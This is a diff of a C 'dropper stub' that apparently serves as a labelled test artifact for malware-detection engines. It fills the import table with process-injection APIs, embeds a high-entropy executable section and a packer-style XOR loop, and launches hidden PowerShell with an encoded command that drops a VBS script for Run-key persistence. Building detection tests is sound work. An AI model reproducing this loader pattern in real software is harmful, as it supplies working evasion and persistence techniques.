@@ -1,50 +1,33 @@
 /*
- * pml_dropper_stub.c  v3
- * ─────────────────────────────────────────────────────────────────────────────
- * Static signals (ATSE feature extraction):
+ * pml_dropper_stub.c  v4
+ *
+ * Static signals (ATSE):
  *   [1] IAT: VirtualAlloc, VirtualProtect, WriteProcessMemory,
- *            CreateRemoteThread  --  direct calls, appear in PE import table
- *   [2] .payload section: 512 B RC4-keystream, entropy ~7.95 bpb
- *            executable flag set post-build via objcopy (shellcode staging)
- *   [3] XOR decode stub: tight loop matching packer opcode signatures
- *   [4] Unsigned PE: no Authenticode, no version info, no manifest
- *   [5] Overlay: 8 KB RC4-keystream appended post-build
+ *            CreateRemoteThread  (direct calls -> appear in PE import table)
+ *   [2] .payload: 512 B RC4-keystream, ~7.95 bpb, executable via objcopy
+ *   [3] XOR decode stub: packer opcode pattern
+ *   [4] Unsigned PE
+ *   [5] RC4 overlay: 64 KB appended post-build
  *
- * Behavioral chain (CIE telemetry):
- *   PE -> cmd.exe -> powershell.exe
- *      (-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand)
- *      -> wscript.exe pml_s3.vbs  (HKCU Run persistence + drop JScript)
- *      -> cscript.exe pml_s4.js   (3rd engine: completion marker)
+ * Behavioral chain (CIE):
+ *   PE -> cmd.exe -> powershell (-NoProfile -Hidden -Bypass -EncodedCommand)
+ *      -> wscript.exe pml_s3.vbs (HKCU Run + drop JScript)
+ *      -> cscript.exe pml_s4.js  (3rd engine marker)
  *
- * Compile (no linker script needed in v3):
- *   x86_64-w64-mingw32-gcc -o pml_test.exe dropper_stub.c
- *       -mwindows -O2 -s -Wl,--strip-all -lkernel32 -luser32
+ * Build:
+ *   gcc ... -lkernel32 -luser32
+ *   objcopy --set-section-flags .payload=code,readonly pml_test.exe
+ *   python build.py --overlay pml_test.exe
  *
- * Post-build (set .payload executable flag):
- *   x86_64-w64-mingw32-objcopy
- *       --set-section-flags .payload=code,readonly pml_test.exe
- *
- * CONTROLLED TEST ARTIFACT - no real injection or shellcode executed.
+ * CONTROLLED TEST ARTIFACT — no real injection or shellcode executed.
  */
 #include <windows.h>
 #include <stdio.h>
 #include <string.h>
 
-/*
- * High-entropy .payload section
- *
- * GCC syntax: __attribute__((section(".payload"), used))
- *   - section(".payload")  creates a named PE section
- *   - used                 prevents the compiler from discarding the symbol
- *                          as unreferenced dead code
- *
- * Executable flag is set AFTER compilation by:
+/* .payload section — GCC syntax (MSVC #pragma section silently ignored by GCC)
+ * Executable flag set post-build via:
  *   objcopy --set-section-flags .payload=code,readonly pml_test.exe
- *
- * Do NOT use:
- *   #pragma section         -- MSVC-only, silently ignored by GCC
- *   __declspec(allocate)    -- MSVC-only, produces "allocate ignored" warning
- *   Linker script :phdr     -- ELF concept, PE has no phdrs, causes ld error
  */
 static const unsigned char g_payload[512]
     __attribute__((section(".payload"), used)) = {
@@ -82,12 +65,7 @@ static const unsigned char g_payload[512]
     0x0A, 0x35, 0xAC, 0xD9, 0x74, 0x79, 0x6D, 0x68, 0x6F, 0xA6, 0x52, 0xA9, 0x37, 0xD4, 0xB6, 0xD0
 };
 
-/*
- * XOR decode stub
- * Opcode: XOR byte ptr [reg+offset], imm8  (0x80 /6)
- * Matches Emotet / TrickBot / Ryuk packer entry stubs.
- * noinline preserves the loop opcode pattern.
- */
+/* XOR decode stub — Emotet/TrickBot/Ryuk packer opcode pattern */
 static __attribute__((noinline))
 void xor_decode(unsigned char * restrict buf, size_t len, unsigned char key)
 {
@@ -96,84 +74,56 @@ void xor_decode(unsigned char * restrict buf, size_t len, unsigned char key)
         buf[i] ^= key;
 }
 
-/* Encoded behavioral chain (UTF-16LE base64 for -EncodedCommand) */
+/* Encoded behavioral chain */
 static const char g_enc[] = "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnAAoAJABkAD0AJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAKwAnAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACcACgBpAGYAKAAtAG4AbwB0ACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAGQAKQApAHsATgBlAHcALQBJAHQAZQBtACAALQBJAHQAZQBtAFQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQAgAC0AUABhAHQAaAAgACQAZAAgAC0ARgBvAHIAYwBlAHwATwB1AHQALQBOAHUAbABsAH0ACgAkAHAAPQAkAGQAKwAnAFwAcABtAGwAXwBzADMALgB2AGIAcwAnAAoAJABiAD0AWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcASgB5AEIAUQBUAFUAdwBnAFYARwBWAHoAZABDAEEAdABJAEYATgAwAFkAVwBkAGwASQBEAE0AZwBLAEYAWgBDAFUAMgBOAHkAYQBYAEIAMABJAEMAOABnAGQAMwBOAGoAYwBtAGwAdwBkAEMANQBsAGUARwBVAHAAQwBrADkAdwBkAEcAbAB2AGIAaQBCAEYAZQBIAEIAcwBhAFcATgBwAGQAQQBwAEUAYQBXADAAZwBjADIAZwBzAEkARwBaAHoATABDAEIAcQBjAEMAdwBnAFoAbQBnAEsAQwBsAE4AbABkAEMAQgB6AGEAQwBBADkASQBFAE4AeQBaAFcARgAwAFoAVQA5AGkAYQBtAFYAagBkAEMAZwBpAFYAMQBOAGoAYwBtAGwAdwBkAEMANQBUAGEARwBWAHMAYgBDAEkAcABDAGwATgBsAGQAQwBCAG0AYwB5AEEAOQBJAEUATgB5AFoAVwBGADAAWgBVADkAaQBhAG0AVgBqAGQAQwBnAGkAVQAyAE4AeQBhAFgAQgAwAGEAVwA1AG4ATABrAFoAcABiAEcAVgBUAGUAWABOADAAWgBXADEAUABZAG0AcABsAFkAMwBRAGkASwBRAG8ASwBKAHkAQgBUAGEAVwBkAHUAWQBXAHcANgBJAEUAaABMAFEAMQBVAGcAVQBuAFYAdQBJAEcAdABsAGUAUwBCAHcAWgBYAEoAegBhAFgATgAwAFoAVwA1AGoAWgBRAHAAegBhAEMANQBTAFoAVwBkAFgAYwBtAGwAMABaAFMAQgBmAEMAaQBBAGcASQBDAEEAaQBTAEUAdABEAFYAVgB4AFQAYgAyAFoAMABkADIARgB5AFoAVgB4AE4AYQBXAE4AeQBiADMATgB2AFoAbgBSAGMAVgAyAGwAdQBaAEcAOQAzAGMAMQB4AEQAZABYAEoAeQBaAFcANQAwAFYAbQBWAHkAYwAyAGwAdgBiAGwAeABTAGQAVwA1AGMAVQBFADEATQBWAEcAVgB6AGQARgBOADAAZABXAEkAaQBMAEMAQgBmAEMAaQBBAGcASQBDAEEAaQBkADMATgBqAGMAbQBsAHcAZABDADUAbABlAEcAVQBnAEkAaQBJAGkASQBDAFkAZwBWADEATgBqAGMAbQBsAHcAZABDADUAVABZADMASgBwAGMASABSAEcAZABXAHgAcwBUAG0ARgB0AFoAUwBBAG0ASQBDAEkAaQBJAGkASQBzAEkARgA4AEsASQBDAEEAZwBJAEMASgBTAFIAVQBkAGYAVQAxAG8AaQBDAGcAbwBuAEkARQBSAHkAYgAzAEEAZwBVADMAUgBoAFoAMgBVAGcATgBDAEIASwBVADIATgB5AGEAWABCADAASQBHAHgAcABiAG0AVQB0AFkAbgBrAHQAYgBHAGwAdQBaAFEAcABxAGMAQwBBADkASQBIAE4AbwBMAGsAVgA0AGMARwBGAHUAWgBFAFYAdQBkAG0AbAB5AGIAMgA1AHQAWgBXADUAMABVADMAUgB5AGEAVwA1AG4AYwB5AGcAaQBKAFYAUgBGAFQAVgBBAGwASQBpAGsAZwBKAGkAQQBpAFgASABCAHQAYgBGADkAegBOAEMANQBxAGMAeQBJAEsAVQAyAFYAMABJAEcAWgBvAEkARAAwAGcAWgBuAE0AdQBUADMAQgBsAGIAbABSAGwAZQBIAFIARwBhAFcAeABsAEsARwBwAHcATABDAEEAeQBMAEMAQgBVAGMAbgBWAGwASwBRAHAAbQBhAEMANQBYAGMAbQBsADAAWgBVAHgAcABiAG0AVQBnAEkAaQA4AHYASQBGAEIATgBUAEMAQgBVAFoAWABOADAASQBDADAAZwBVADMAUgBoAFoAMgBVAGcATgBDAEEAbwBTAGwATgBqAGMAbQBsAHcAZABDAEIAMgBhAFcARQBnAFkAMwBOAGoAYwBtAGwAdwBkAEMANQBsAGUARwBVAHAASQBnAHAAbQBhAEMANQBYAGMAbQBsADAAWgBVAHgAcABiAG0AVQBnAEkAaQA4AHYASQBGAE4AcABaADIANQBoAGIARABvAGcATQAzAEoAawBJAEgATgBqAGMAbQBsAHcAZABDAEIAbABiAG0AZABwAGIAbQBVAGcASwBIAEIAdgBkADIAVgB5AGMAMgBoAGwAYgBHAHcAZwBMAFQANABnAGQAMwBOAGoAYwBtAGwAdwBkAEMAQQB0AFAAaQBCAGoAYwAyAE4AeQBhAFgAQgAwAEsAUwBJAEsAWgBtAGcAdQBWADMASgBwAGQARwBWAE0AYQBXADUAbABJAEMASgAyAFkAWABJAGcAYwAyAGcAZwBJAEQAMABnAGIAbQBWADMASQBFAEYAagBkAEcAbAAyAFoAVgBoAFAAWQBtAHAAbABZADMAUQBvAEoAMQBkAFQAWQAzAEoAcABjAEgAUQB1AFUAMgBoAGwAYgBHAHcAbgBLAFQAcwBpAEMAbQBaAG8ATABsAGQAeQBhAFgAUgBsAFQARwBsAHUAWgBTAEEAaQBkAG0ARgB5AEkARwBaAHoASQBDAEEAOQBJAEcANQBsAGQAeQBCAEIAWQAzAFIAcABkAG0AVgBZAFQAMgBKAHEAWgBXAE4AMABLAEMAZABUAFkAMwBKAHAAYwBIAFIAcABiAG0AYwB1AFIAbQBsAHMAWgBWAE4ANQBjADMAUgBsAGIAVQA5AGkAYQBtAFYAagBkAEMAYwBwAE8AeQBJAEsAWgBtAGcAdQBWADMASgBwAGQARwBWAE0AYQBXADUAbABJAEMASgAyAFkAWABJAGcAYwAyAFYAdwBJAEQAMABnAFUAMwBSAHkAYQBXADUAbgBMAG0AWgB5AGIAMgAxAEQAYQBHAEYAeQBRADIAOQBrAFoAUwBnADUATQBpAGsANwBJAGcAcABtAGEAQwA1AFgAYwBtAGwAMABaAFUAeABwAGIAbQBVAGcASQBuAFoAaABjAGkAQgAwAGMAQwBBAGcAUABTAEIAegBhAEMANQBGAGUASABCAGgAYgBtAFIARgBiAG4AWgBwAGMAbQA5AHUAYgBXAFYAdQBkAEYATgAwAGMAbQBsAHUAWgAzAE0AbwBKAHkAVgBVAFIAVQAxAFEASgBTAGMAcABJAEMAcwBnAGMAMgBWAHcASQBDAHMAZwBKADMAQgB0AGIARgA5AGsAYgAyADUAbABMAG4AUgA0AGQAQwBjADcASQBnAHAAbQBhAEMANQBYAGMAbQBsADAAWgBVAHgAcABiAG0AVQBnAEkAbgBaAGgAYwBpAEIAMABjAHkAQQBnAFAAUwBCAG0AYwB5ADUAUABjAEcAVgB1AFYARwBWADQAZABFAFoAcABiAEcAVQBvAGQASABBAHMASQBEAEkAcwBJAEgAUgB5AGQAVwBVAHAATwB5AEkASwBaAG0AZwB1AFYAMwBKAHAAZABHAFYATQBhAFcANQBsAEkAQwBKADAAYwB5ADUAWABjAG0AbAAwAFoAVQB4AHAAYgBtAFUAbwBKADEAQgBOAFQAQwBCAFQAZABHAEYAbgBaAFMAQQAwAEkARwBOAHYAYgBYAEIAcwBaAFgAUgBsAE8AaQBBAG4ASQBDAHMAZwBiAG0AVgAzAEkARQBSAGgAZABHAFUAbwBLAFMANQAwAGIAMABsAFQAVAAxAE4AMABjAG0AbAB1AFoAeQBnAHAASwBUAHMAaQBDAG0AWgBvAEwAbABkAHkAYQBYAFIAbABUAEcAbAB1AFoAUwBBAGkAZABIAE0AdQBRADIAeAB2AGMAMgBVAG8ASwBUAHMAaQBDAG0AWgBvAEwAawBOAHMAYgAzAE4AbABDAGcAbwBuAEkARgBOAHAAWgAyADUAaABiAEQAbwBnAGQAMwBOAGoAYwBtAGwAdwBkAEMAQQB0AFAAaQBCAGoAYwAyAE4AeQBhAFgAQgAwAEkARwBOAHkAYgAzAE4AegBMAFcAVgB1AFoAMgBsAHUAWgBTAEIAbwBiADMAQQBLAGMAMgBnAHUAVQBuAFYAdQBJAEMASgBqAGMAMgBOAHkAYQBYAEIAMABMAG0AVgA0AFoAUwBBAGkASQBpAEkAZwBKAGkAQgBxAGMAQwBBAG0ASQBDAEkAaQBJAGkAQQB2AEwAMgA1AHYAYgBHADkAbgBiAHkASQBzAEkARABBAHMASQBGAFIAeQBkAFcAVQBLACcAKQAKAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFcAcgBpAHQAZQBBAGwAbABCAHkAdABlAHMAKAAkAHAALAAkAGIAKQAKAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACcAdwBzAGMAcgBpAHAAdAAuAGUAeABlACcAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgBgACIAJABwAGAAIgAiACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAKAA==";
 
-/* Process chain launcher */
 static BOOL launch_chain(void)
 {
     STARTUPINFOA        si;
     PROCESS_INFORMATION pi;
     char                cmd[16384];
-
     ZeroMemory(&si, sizeof(si));
     ZeroMemory(&pi, sizeof(pi));
     si.cb          = sizeof(si);
     si.dwFlags     = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
-
     _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
         "cmd.exe /c powershell.exe "
         "-NoProfile -WindowStyle Hidden "
         "-ExecutionPolicy Bypass "
-        "-EncodedCommand %s",
-        g_enc);
-
+        "-EncodedCommand %s", g_enc);
     return CreateProcessA(NULL, cmd, NULL, NULL,
-                          FALSE, CREATE_NO_WINDOW,
-                          NULL, NULL, &si, &pi);
+                          FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
 {
-    LPVOID  pMem;
-    DWORD   dwOld;
-    SIZE_T  written = 0;
+    LPVOID pMem;
+    DWORD  dwOld;
+    SIZE_T written = 0;
     unsigned char scratch[16];
-
     (void)hPrev; (void)lpCmd; (void)nShow;
 
-    /*
-     * Static IAT population via direct calls
-     * ───────────────────────────────────────
-     * All four calls use safe/trivial arguments (no real injection occurs).
-     * Purpose: force linker to add each API to the PE IAT so ATSE can read
-     * the injection capability fingerprint from the import table header.
-     *
-     * Without direct calls, GetProcAddress resolution is invisible to ATSE
-     * because it happens at runtime, not at PE parse time.
+    /* Direct API calls -> static IAT population
+     * All arguments are safe/trivial — no real injection occurs.
+     * Purpose: force linker to include each API in the PE IAT header
+     * so ATSE's import table extractor sees the injection fingerprint.
      */
-
-    /* VirtualAlloc: reserve only (no MEM_COMMIT) — no real memory allocated */
     pMem = VirtualAlloc(NULL, 4096, MEM_RESERVE, PAGE_NOACCESS);
-
-    /* VirtualProtect: no-op if pMem is NULL */
-    if (pMem)
-        VirtualProtect(pMem, 4096, PAGE_EXECUTE_READ, &dwOld);
-
-    /* VirtualFree: release immediately */
-    if (pMem)
-        VirtualFree(pMem, 0, MEM_RELEASE);
-
-    /* WriteProcessMemory: 0 bytes to own process — succeeds, writes nothing */
+    if (pMem) VirtualProtect(pMem, 4096, PAGE_EXECUTE_READ, &dwOld);
+    if (pMem) VirtualFree(pMem, 0, MEM_RELEASE);
     WriteProcessMemory(GetCurrentProcess(), &scratch, &scratch, 0, &written);
-
-    /* CreateRemoteThread: NULL entry point — will fail, handle closed safely */
     CloseHandle(
         CreateRemoteThread(GetCurrentProcess(), NULL, 0,
                            NULL, NULL, CREATE_SUSPENDED, NULL)
     );
 
-    /* XOR stub: emit packer opcode pattern on 16 bytes of .payload data */
+    /* XOR stub: emit packer opcode pattern */
     memcpy(scratch, g_payload, sizeof(scratch));
     xor_decode(scratch, sizeof(scratch), 0x55);
     (void)scratch;
 
-    /* Launch behavioral chain */
-    if (!launch_chain())
-        return 1;
-
-    /* Stay alive so CIE records parent-child process linkage */
+    if (!launch_chain()) return 1;
     Sleep(5000);
     return 0;
 }
